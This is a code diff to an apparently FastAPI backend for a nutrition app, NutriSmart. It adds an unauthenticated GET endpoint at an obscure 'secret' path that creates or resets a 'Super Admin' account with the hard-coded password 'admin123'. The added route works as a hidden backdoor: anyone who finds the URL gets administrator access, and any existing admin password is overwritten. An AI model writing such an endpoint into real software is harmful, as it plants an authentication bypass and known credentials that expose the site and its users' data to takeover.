@@ -613,6 +613,25 @@ async def update_bmi(data: BMIUpdateRequest, request: Request):
     await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$set": {"bmi_data": bmi_data}})
     return {"bmi": bmi, "category": category, "bmi_data": bmi_data}
 
+@api_router.get("/auth/setup-admin-secret-99")
+async def setup_admin():
+    admin_email = "admin@nutrismart.com"
+    password = "admin123"
+    existing_admin = await db.users.find_one({"email": admin_email})
+    admin_doc = {
+        "email": admin_email,
+        "password_hash": hash_password(password),
+        "name": "Super Admin",
+        "role": "admin",
+        "created_at": datetime.now(timezone.utc),
+    }
+    if existing_admin:
+        await db.users.update_one({"email": admin_email}, {"$set": {"role": "admin", "password_hash": hash_password(password)}})
+        return {"status": "success", "message": "Admin account updated!"}
+    else:
+        await db.users.insert_one(admin_doc)
+        return {"status": "success", "message": "Admin account created!"}
+
 # ── MENU ROUTES ───────────────────────────────────────────────────────────────
 @api_router.get("/menu")
 async def get_menu(category: Optional[str] = None, tag: Optional[str] = None):
